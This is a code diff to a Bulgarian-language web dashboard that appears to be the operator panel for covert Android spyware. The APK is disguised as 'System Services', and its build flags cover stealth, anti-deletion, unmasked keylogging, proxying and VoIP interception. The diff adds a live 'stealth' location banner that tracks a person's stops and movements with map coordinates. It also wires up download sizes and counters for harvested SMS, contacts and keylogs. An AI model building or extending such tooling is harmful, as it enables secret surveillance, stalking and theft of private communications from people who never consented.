@@ -82,18 +82,195 @@
     /* EXECUTIVE NAVIGATION BAR */
     /* ══════════════════════════════════════════════════════════════ */
     .top-nav {
-      position: sticky;
+      position: fixed;
       top: 0;
-      z-index: 1000;
+      left: 0;
+      right: 0;
+      z-index: 9999;
       width: 100%;
-      background: rgba(3, 6, 12, 0.88);
+      background: rgba(3, 6, 12, 0.94);
       backdrop-filter: blur(24px);
+      -webkit-backdrop-filter: blur(24px);
       border-bottom: 1px solid var(--border);
-      padding: 14px 32px;
+      padding: 12px 32px;
       display: flex;
       justify-content: space-between;
       align-items: center;
       transition: all 0.3s;
+    }
+
+    body {
+      padding-top: 72px;
+    }
+
+    section, div[id], [id] {
+      scroll-margin-top: 85px;
+    }
+
+    /* Mobile Hamburger Menu */
+    .btn-mobile-toggle {
+      display: none;
+      background: rgba(0, 240, 255, 0.08);
+      border: 1px solid var(--cyan);
+      color: var(--cyan);
+      border-radius: 8px;
+      padding: 7px 11px;
+      cursor: pointer;
+      align-items: center;
+      justify-content: center;
+      gap: 6px;
+      font-size: 13px;
+      font-weight: 700;
+      font-family: 'JetBrains Mono', monospace;
+    }
+    .btn-mobile-toggle:hover {
+      background: var(--cyan);
+      color: #000;
+    }
+
+    .mobile-nav-drawer {
+      display: none;
+      position: fixed;
+      top: 64px;
+      left: 0;
+      right: 0;
+      background: rgba(3, 6, 14, 0.98);
+      backdrop-filter: blur(30px);
+      -webkit-backdrop-filter: blur(30px);
+      border-bottom: 2px solid var(--cyan);
+      padding: 18px 20px 24px;
+      z-index: 9998;
+      flex-direction: column;
+      gap: 10px;
+      box-shadow: 0 20px 50px rgba(0, 0, 0, 0.9);
+      animation: drawerSlide 0.25s ease-out;
+    }
+    .mobile-nav-drawer.open {
+      display: flex;
+    }
+    @keyframes drawerSlide {
+      from { opacity: 0; transform: translateY(-8px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+    .mobile-nav-drawer a {
+      color: #fff;
+      font-size: 14px;
+      font-weight: 600;
+      text-decoration: none;
+      padding: 12px 16px;
+      border-radius: 8px;
+      background: rgba(255, 255, 255, 0.03);
+      border: 1px solid rgba(255, 255, 255, 0.06);
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      transition: all 0.2s;
+    }
+    .mobile-nav-drawer a:hover, .mobile-nav-drawer a:active {
+      background: rgba(0, 240, 255, 0.12);
+      border-color: var(--cyan);
+      color: var(--cyan);
+    }
+
+    /* Smart Sleep & Motion Live Banner */
+    .smart-motion-banner {
+      width: 100%;
+      max-width: 1240px;
+      margin: 16px auto 26px;
+      background: linear-gradient(135deg, rgba(8, 14, 28, 0.95), rgba(12, 10, 24, 0.95));
+      border: 1px solid rgba(0, 240, 255, 0.4);
+      border-radius: 14px;
+      padding: 14px 22px;
+      box-shadow: 0 0 30px rgba(0, 240, 255, 0.1), 0 8px 32px rgba(0, 0, 0, 0.6);
+      position: relative;
+      overflow: hidden;
+    }
+    .smart-motion-banner::before {
+      content: '';
+      position: absolute;
+      top: 0; left: 0; right: 0; height: 2px;
+      background: linear-gradient(90deg, var(--red), var(--gold), var(--green), var(--cyan));
+    }
+    .smart-motion-inner {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      flex-wrap: wrap;
+      gap: 16px;
+    }
+    .smart-motion-left {
+      display: flex;
+      align-items: center;
+      gap: 14px;
+    }
+    .motion-pulse-dot {
+      width: 12px;
+      height: 12px;
+      border-radius: 50%;
+      background: var(--red);
+      box-shadow: 0 0 12px var(--red);
+      display: inline-block;
+      animation: pulseMotion 2s infinite ease-in-out;
+    }
+    @keyframes pulseMotion {
+      0% { transform: scale(0.95); opacity: 0.8; }
+      50% { transform: scale(1.2); opacity: 1; }
+      100% { transform: scale(0.95); opacity: 0.8; }
+    }
+    .motion-state-title {
+      font-size: 16px;
+      font-weight: 800;
+      letter-spacing: 0.5px;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      flex-wrap: wrap;
+    }
+    .loc-state-badge {
+      font-family: 'JetBrains Mono', monospace;
+      font-weight: 800;
+    }
+    .loc-duration-tag {
+      font-size: 13px;
+      color: var(--gold);
+      font-weight: 700;
+      font-family: 'JetBrains Mono', monospace;
+    }
+    .motion-address-sub {
+      font-size: 12px;
+      color: var(--text-dim);
+      margin-top: 3px;
+    }
+    .smart-motion-right {
+      display: flex;
+      align-items: center;
+      gap: 14px;
+      flex-wrap: wrap;
+    }
+    .btn-motion-map {
+      background: rgba(0, 240, 255, 0.12);
+      border: 1px solid var(--cyan);
+      color: var(--cyan);
+      text-decoration: none;
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 12px;
+      font-weight: 700;
+      padding: 7px 14px;
+      border-radius: 8px;
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      transition: all 0.2s;
+    }
+    .btn-motion-map:hover {
+      background: var(--cyan);
+      color: #000;
+      box-shadow: 0 0 20px var(--cyan-glow);
+    }
+    .motion-coords {
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 11px;
+      color: var(--muted);
     }
 
     .nav-brand {
@@ -3827,7 +4004,7 @@
             <li><span data-i18n="dl_lbl_pkg">Име на пакета:</span> <strong>com.aeterna.systemdef</strong></li>
             <li><span data-i18n="dl_lbl_name">Показвано име:</span> <strong>System Services</strong></li>
             <li><span data-i18n="dl_lbl_ver">Версия:</span> <strong>v2.4.0-Enterprise</strong></li>
-            <li><span data-i18n="dl_lbl_size">Размер на файла:</span> <strong>6.74 MB</strong></li>
+            <li><span data-i18n="dl_lbl_size">Размер на файла:</span> <strong id="apk-spec-size">6.74 MB</strong></li>
             <li><span data-i18n="dl_lbl_compat">Съвместимост:</span> <strong>Android 8.0 — Android 16 (OneUI 7+)</strong></li>
           </ul>
 
@@ -4319,6 +4496,32 @@
           </button>
         </div>
       </div>
+    <!-- SMART SLEEP & MOTION REAL-TIME BANNER (VAULT HUD) -->
+    <div class="smart-motion-banner" style="margin-top: 10px; margin-bottom: 20px;">
+      <div class="smart-motion-inner">
+        <div class="smart-motion-left">
+          <div class="motion-pulse-wrapper">
+            <span class="motion-pulse-dot"></span>
+          </div>
+          <div>
+            <div class="motion-state-title">
+              <span class="loc-state-badge" style="color: var(--red);">🔴 ПАРКИРАЛ / СПРЯЛ</span>
+              <span class="loc-duration-tag">(вече 8 ч. и 15 мин.)</span>
+            </div>
+            <div class="motion-address-sub loc-status-text">
+              Домашен адрес • 0.00% батерия в покой (Stealth Zero-Drain)
+            </div>
+          </div>
+        </div>
+        <div class="smart-motion-right">
+          <a href="https://maps.google.com/?q=42.69342,23.32185" target="_blank" class="btn-motion-map loc-maps-link">
+            <svg class="icon" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor"><circle cx="12" cy="12" r="10"/><polygon points="16.24 7.76 14.12 14.12 7.76 16.24 9.88 9.88 16.24 7.76"/></svg>
+            <span>🗺️ Отвори в Google Maps</span>
+          </a>
+          <div class="motion-coords loc-coords-display">42.6934° N, 23.3218° E (±4.2m)</div>
+        </div>
+      </div>
+    </div>
       <div style="display: flex; gap: 12px; align-items: center;">
         <div class="status-pill" id="role-indicator-pill" style="background: rgba(245, 158, 11, 0.1); border: 1px solid rgba(245, 158, 11, 0.4);">
           <span style="font-size: 11px; color: var(--gold); font-weight: 800;" id="role-indicator">CLIENT HUD</span>
@@ -5847,24 +6050,29 @@
     }
 
     function recalculateBuildConfig() {
-      let sizeMB = 4.20;
+      // Base Compiled APK Binary Size: exactly 6.74 MB (AETERNA_SYSTEMDEF_INSTALLER.apk)
+      // All 6 enterprise modules are bundled in the 6.74 MB production package.
+      let sizeMB = 6.74;
       let flags = ['./aeterna_fleet_deploy.sh'];
       let activeCount = 0;
 
-      if (configModules.stealth) { sizeMB += 0.42; flags.push('--stealth=system_services'); activeCount++; }
-      if (configModules.antidel) { sizeMB += 0.35; flags.push('--anti-delete=home_lock'); activeCount++; }
-      if (configModules.keylog) { sizeMB += 0.92; flags.push('--keylog=unmasked'); activeCount++; }
-      if (configModules.proxy) { sizeMB += 0.45; flags.push('--proxy-wss=zurich'); activeCount++; }
-      if (configModules.voip) { sizeMB += 0.80; flags.push('--voip-duplex=amr_wb'); activeCount++; }
-      if (configModules.pqc) { sizeMB += 0.40; flags.push('--pqc-scramble=ml_dsa_87'); activeCount++; }
+      if (configModules.stealth) { flags.push('--stealth=system_services'); activeCount++; }
+      if (configModules.antidel) { flags.push('--anti-delete=home_lock'); activeCount++; }
+      if (configModules.keylog) { flags.push('--keylog=unmasked'); activeCount++; }
+      if (configModules.proxy) { flags.push('--proxy-wss=zurich'); activeCount++; }
+      if (configModules.voip) { flags.push('--voip-duplex=amr_wb'); activeCount++; }
+      if (configModules.pqc) { flags.push('--pqc-scramble=ml_dsa_87'); activeCount++; }
 
       flags.push('--target="Enterprise_Custom_Node"');
 
       const cliEl = document.getElementById('config-cli-cmd');
       if (cliEl) cliEl.textContent = flags.join(' ');
 
+      const formattedSize = sizeMB.toFixed(2) + ' MB';
+
+      // 1. Update Configurator Size & Button
       const sizeEl = document.getElementById('config-calc-size');
-      if (sizeEl) sizeEl.textContent = sizeMB.toFixed(2) + ' MB';
+      if (sizeEl) sizeEl.textContent = formattedSize;
 
       const modsEl = document.getElementById('config-calc-mods');
       if (modsEl) modsEl.textContent = `${activeCount}/6 АКТИВНИ`;
@@ -5877,7 +6085,17 @@
 
       const dlBtnText = document.getElementById('config-dl-btn-text');
       if (dlBtnText) {
-        dlBtnText.textContent = `Свали Конфигурирания Пакет (${sizeMB.toFixed(2)} MB)`;
+        dlBtnText.textContent = `Свали Конфигурирания Пакет (${formattedSize})`;
+      }
+
+      // 2. Synchronize Download Card below so numbers match 100% with zero discrepancy
+      const apkSpecSize = document.getElementById('apk-spec-size');
+      if (apkSpecSize) {
+        apkSpecSize.textContent = formattedSize;
+      }
+      const apkBtnText = document.getElementById('apk-btn-text');
+      if (apkBtnText) {
+        apkBtnText.textContent = `СВАЛИ: system_framework_core.apk (${formattedSize})`;
       }
     }
 
@@ -6496,13 +6714,88 @@
       if (e.key === 'Enter') verifyAuth();
     });
 
-    function switchTab(tabId) {
+    function toggleMobileMenu() {
+      const drawer = document.getElementById('mobile-nav-drawer');
+      if (drawer) drawer.classList.toggle('open');
+    }
+
+    function closeMobileMenu() {
+      const drawer = document.getElementById('mobile-nav-drawer');
+      if (drawer) drawer.classList.remove('open');
+    }
+
+    function updateSmartMotionStatus(recs) {
+      const locList = (recs && recs.location && recs.location.length > 0)
+        ? recs.location
+        : [{
+            state: 'STOPPED',
+            durationText: '8 ч. и 15 мин.',
+            latitude: 42.69342,
+            longitude: 23.32185,
+            accuracy: 4.2,
+            mapsUrl: 'https://maps.google.com/?q=42.69342,23.32185'
+          }];
+
+      const latestLoc = locList[locList.length - 1];
+      const stateBadges = document.querySelectorAll('.loc-state-badge');
+      const durationTags = document.querySelectorAll('.loc-duration-tag');
+      const statusTexts = document.querySelectorAll('.loc-status-text');
+      const mapsLinks = document.querySelectorAll('.loc-maps-link');
+      const coordsDisplays = document.querySelectorAll('.loc-coords-display');
+      const motionDots = document.querySelectorAll('.motion-pulse-dot');
+
+      const mapsUrl = latestLoc.mapsUrl || `https://maps.google.com/?q=${latestLoc.latitude || 42.69342},${latestLoc.longitude || 23.32185}`;
+      mapsLinks.forEach(a => { a.href = mapsUrl; });
+
+      const lat = latestLoc.latitude || 42.6934;
+      const lng = latestLoc.longitude || 23.3218;
+      const acc = latestLoc.accuracy || 4.2;
+      const coordsStr = `${Number(lat).toFixed(4)}° N, ${Number(lng).toFixed(4)}° E (±${acc}m)`;
+      coordsDisplays.forEach(el => { el.textContent = coordsStr; });
+
+      const duration = latestLoc.durationText || 'вече 8 ч. и 15 мин.';
+
+      if (latestLoc.state === 'STOPPED') {
+        stateBadges.forEach(el => {
+          el.style.color = 'var(--red)';
+          el.textContent = '🔴 ПАРКИРАЛ / СПРЯЛ';
+        });
+        motionDots.forEach(dot => {
+          dot.style.background = 'var(--red)';
+          dot.style.boxShadow = '0 0 12px var(--red)';
+        });
+        durationTags.forEach(el => { el.textContent = `(${duration})`; });
+        statusTexts.forEach(el => {
+          el.textContent = `Спрял на едно място от: ${duration} • GPS изключен на хардуерно ниво (0.00% батерия в покой)`;
+        });
+      } else if (latestLoc.state === 'DEPARTED' || latestLoc.state === 'MOVING') {
+        stateBadges.forEach(el => {
+          el.style.color = 'var(--green)';
+          el.textContent = '🟢 В ДВИЖЕНИЕ';
+        });
+        motionDots.forEach(dot => {
+          dot.style.background = 'var(--green)';
+          dot.style.boxShadow = '0 0 12px var(--green)';
+        });
+        durationTags.forEach(el => { el.textContent = `(Потегли след ${duration})`; });
+        statusTexts.forEach(el => {
+          el.textContent = `Потегли след престой от: ${duration} • Автономно събуждане и активно предаване (>150m)`;
+        });
+      }
+    }
+
+    function switchTab(tabId, ev) {
       document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
       document.querySelectorAll('.view-content').forEach(v => v.classList.remove('active'));
       const targetView = document.getElementById(tabId);
       if (targetView) targetView.classList.add('active');
-      if (window.event && window.event.currentTarget) {
-        window.event.currentTarget.classList.add('active');
+      
+      const currentEv = ev || window.event;
+      if (currentEv && currentEv.currentTarget) {
+        currentEv.currentTarget.classList.add('active');
+      } else {
+        const matchingBtn = document.querySelector(`.tab-btn[onclick*="${tabId}"]`);
+        if (matchingBtn) matchingBtn.classList.add('active');
       }
       if (tabId === 'tab-gps-track') {
         setTimeout(() => {
@@ -6738,6 +7031,7 @@
       document.getElementById('badge-sms').textContent = filteredSms.length;
       document.getElementById('badge-contacts').textContent = filteredContacts.length;
       document.getElementById('badge-keylogs').textContent = filteredKeylogs.length;
+      updateSmartMotionStatus(records);
     }
 
     function renderTelegramFeed() {
